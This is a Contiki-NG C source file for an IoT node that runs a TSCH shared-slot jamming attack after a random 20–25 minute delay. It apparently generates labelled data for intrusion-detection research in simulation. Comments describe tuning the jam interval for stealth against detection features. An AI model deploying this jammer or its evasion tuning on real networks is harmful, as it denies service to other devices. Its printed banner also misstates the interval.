#include "contiki.h"
#include "net/routing/routing.h"
#include "random.h"
#include "net/netstack.h"
#include "net/ipv6/simple-udp.h"
#include "net/mac/4emac/4emac-private.h"
#include "net/app-layer/attack-analyzer/attacker-analyzer.h"
#include "net/packetbuf.h"

#include "sys/log.h"
#define LOG_MODULE "SharedSlotAttack"
#define LOG_LEVEL LOG_LEVEL_INFO

/* Normal mode settings */
#define UDP_CLIENT_PORT 8765
#define UDP_SERVER_PORT 5678
#define NORMAL_SEND_INTERVAL (15 * CLOCK_SECOND)
#define JRC_IP_ADDR { 0xfd, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05 }
static uip_ipaddr_t jrc_ip_addr;
static struct simple_udp_connection udp_conn;

/*
 * Attack mode settings.
 * 100ms -> 500ms reduces packets/s from 10 to 2; the original rate
 * pinned shared slots so hard that the network barely formed and the
 * attack was trivially separable in delta_tx / tx_slot_count features.
 * 500ms still contends for shared slots but leaves the network functional.
 */
/*
 * Stealth v3: 500ms -> 2s (4x reduction). The old value kept contention
 * heavy and directly spiked the shared-slot usage ratio, leaving a clear
 * signature in the tx_slot_count / delta_tx features (F1>0.97). At 2s the
 * contention for slots continues, but other nodes in the network can also
 * use the slots, so the class-overlap area grows.
 */
#ifndef SHARED_SLOT_ATTACK_INTERVAL
#define SHARED_SLOT_ATTACK_INTERVAL (2 * CLOCK_SECOND)
#endif
#define ATTACK_INTERVAL SHARED_SLOT_ATTACK_INTERVAL

/*
 * Phase transition - in the 30-min headless run scheme the attack starts at
 * minute 3 (shared-slot is routing-independent).
 */
#define ATTACK_DELAY_MIN (20 * 60 * CLOCK_SECOND)  // 60-min run; attack start random in [20,25] min
#define ATTACK_DELAY_MAX (25 * 60 * CLOCK_SECOND)

static void jamming_packet_sent(void *ptr, int status, int transmissions);
static process_event_t event_mac_sent;

/*---------------------------------------------------------------------------*/
PROCESS(shared_slot_attack_process, "Shared Slot Attack Client");
AUTOSTART_PROCESSES(&shared_slot_attack_process);
/*---------------------------------------------------------------------------*/
static void
udp_rx_callback(struct simple_udp_connection *c,
         const uip_ipaddr_t *sender_addr,
         uint16_t sender_port,
         const uip_ipaddr_t *receiver_addr,
         uint16_t receiver_port,
         const uint8_t *data,
         uint16_t datalen)
{
  unsigned count = *(unsigned *)data;
  LOG_INFO("Received response %u from ", count);
  LOG_INFO_6ADDR(sender_addr);
  LOG_INFO_("\n");
}
/*---------------------------------------------------------------------------*/
static void
jamming_packet_sent(void *ptr, int status, int transmissions)
{
  /* Fire-and-forget. We deliberately do NOT block the attack loop on this
   * confirmation: broadcast frames do not reliably produce a MAC-sent callback
   * in TSCH, so waiting here stalls the process and silences the attacker's
   * normal UDP traffic (app_packet_count freezes -> app-silence artefact). */
}
/*---------------------------------------------------------------------------*/
PROCESS_THREAD(shared_slot_attack_process, ev, data)
{
  static struct etimer periodic_timer;
    static struct etimer attack_delay_timer;
    static struct etimer app_send_timer;
    static unsigned count = 0;
  uip_ipaddr_t dest_ipaddr;

  PROCESS_BEGIN();

    event_mac_sent = process_alloc_event();

    /* --- Initialization for normal operation --- */
    uint8_t jrc_addr[16] = JRC_IP_ADDR;
  memcpy(jrc_ip_addr.u8, jrc_addr, 16);
  simple_udp_register(&udp_conn, UDP_CLIENT_PORT, NULL,
                      UDP_SERVER_PORT, udp_rx_callback);
  foure_timesynch_init(0);

    /* Initialize attacker analyzer - starts in normal mode.
     * caller_type=0 uses simple_udp_sendto (client API), matching the other
     * 6 attack clients. Previously this was 1 (server-side raw uIP API),
     * which sent telemetry via a different code path; now consistent. */
    attacker_analyzer_init(0, &udp_conn, (void *)&jrc_ip_addr, (unsigned short)UDP_SERVER_PORT, 0, ATTACK_TYPE_NONE);

    LOG_INFO("SHAREDSLOT: Node starting in normal mode. Attack will begin in 20-25 minutes.\n");
    clock_time_t attack_delay = ATTACK_DELAY_MIN + (random_rand() % (ATTACK_DELAY_MAX - ATTACK_DELAY_MIN));
    LOG_INFO("Attack delay drawn: %lu sec (uniform [20,25] min)\n", (unsigned long)(attack_delay / CLOCK_SECOND));
    etimer_set(&attack_delay_timer, attack_delay);
  etimer_set(&periodic_timer, random_rand() % NORMAL_SEND_INTERVAL);

  /* --- Normal Phase Loop --- */
  while(!etimer_expired(&attack_delay_timer)) {
  PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&periodic_timer));

      if(etimer_expired(&attack_delay_timer)) {
          break;
      }

  if(NETSTACK_ROUTING.node_is_reachable() && NETSTACK_ROUTING.get_root_ipaddr(&dest_ipaddr)) {
          LOG_INFO("SHAREDSLOT: Sending normal UDP packet %u to ", count);
    LOG_INFO_6ADDR(&dest_ipaddr);
    LOG_INFO_("\n");
      {
        uint32_t packed = attacker_pack_app_pkt((uint32_t)count);
        simple_udp_sendto(&udp_conn, &packed, sizeof(packed), &dest_ipaddr);
      }
    count++;
          attacker_analyzer_set_app_packet_count(count);
  } else {
          LOG_INFO("SHAREDSLOT: Normal mode: Not reachable yet\n");
  }
      etimer_set(&periodic_timer, NORMAL_SEND_INTERVAL - CLOCK_SECOND + (random_rand() % (2 * CLOCK_SECOND)));
  }

  /* --- Attack Phase Loop --- */
  printf("==============================================\n");
  printf("*** SHARED SLOT ATTACK PHASE STARTED ***\n");
  printf("Will jam shared slots by sending broadcast packets!\n");
  printf("Interval: 100ms (10 packets/sec)\n");
  printf("==============================================\n");
  LOG_INFO("SHAREDSLOT: Switching to SHARED SLOT attack mode\n");
  
  /* Set attack mode label */
  attacker_analyzer_set_attack_mode(1, ATTACK_TYPE_SHARED_SLOT);
  
  etimer_set(&periodic_timer, ATTACK_INTERVAL);
  etimer_set(&app_send_timer, NORMAL_SEND_INTERVAL);

  while(1) {
      PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&periodic_timer) ||
                               etimer_expired(&app_send_timer));

      /* --- Jam branch --- */
      if(etimer_expired(&periodic_timer)) {
          LOG_INFO("SHAREDSLOT: Sending jamming packet to broadcast\n");
          packetbuf_clear();
          char garbage[] = "jamming_packet";
          packetbuf_copyfrom(garbage, sizeof(garbage));
          packetbuf_set_datalen(sizeof(garbage));
          linkaddr_t broadcast_addr;
          linkaddr_copy(&broadcast_addr, &linkaddr_null);
          /* EXPLICITLY set the receiver address to broadcast (linkaddr_null).
           * This line was missing in the previous version; broadcast worked
           * only by accident because packetbuf_clear() zeroed the address field. */
          packetbuf_set_addr(PACKETBUF_ADDR_RECEIVER, &broadcast_addr);
          NETSTACK_MAC.send(jamming_packet_sent, NULL);
          /* Non-blocking: queue the jam frame and immediately continue so the
           * normal app-send branch below keeps running -- the attacker stays
           * application-active (sends UDP at its TX slots) while jamming the
           * shared cells, instead of stalling and going application-silent. */
          etimer_set(&periodic_timer, ATTACK_INTERVAL);
      }

      /* --- Normal app-send branch (stealth: keep UDP traffic alive) --- */
      if(etimer_expired(&app_send_timer)) {
          if(NETSTACK_ROUTING.node_is_reachable() && NETSTACK_ROUTING.get_root_ipaddr(&dest_ipaddr)) {
              uint32_t packed = attacker_pack_app_pkt((uint32_t)count);
              simple_udp_sendto(&udp_conn, &packed, sizeof(packed), &dest_ipaddr);
              count++;
              attacker_analyzer_set_app_packet_count(count);
          }
          etimer_set(&app_send_timer, NORMAL_SEND_INTERVAL - CLOCK_SECOND + (random_rand() % (2 * CLOCK_SECOND)));
      }
  }

  PROCESS_END();
} 
/*---------------------------------------------------------------------------*/